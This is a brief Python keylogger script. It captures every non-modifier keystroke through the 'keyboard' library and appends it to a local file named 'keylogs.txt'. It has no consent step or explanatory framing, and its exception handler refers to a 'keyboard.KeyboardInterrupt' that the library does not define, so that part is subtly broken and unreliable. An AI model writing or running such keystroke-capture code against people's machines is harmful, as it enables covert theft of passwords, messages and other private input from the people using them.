import keyboard
import sys
import time

LOG_FILE = 'keylogs.txt'

def main():
    try:
        while True:
            event = keyboard.read_event()
            
            if event.name not in keyboard.all_modifiers:
                with open(LOG_FILE, 'a') as f:
                    f.write(event.name + '\n')
                    
            sys.stdout.flush()
    except keyboard.KeyboardInterrupt:
        pass
    except Exception as e:
        print("Error occurred:", str(e))

if __name__ == "__main__":
    main()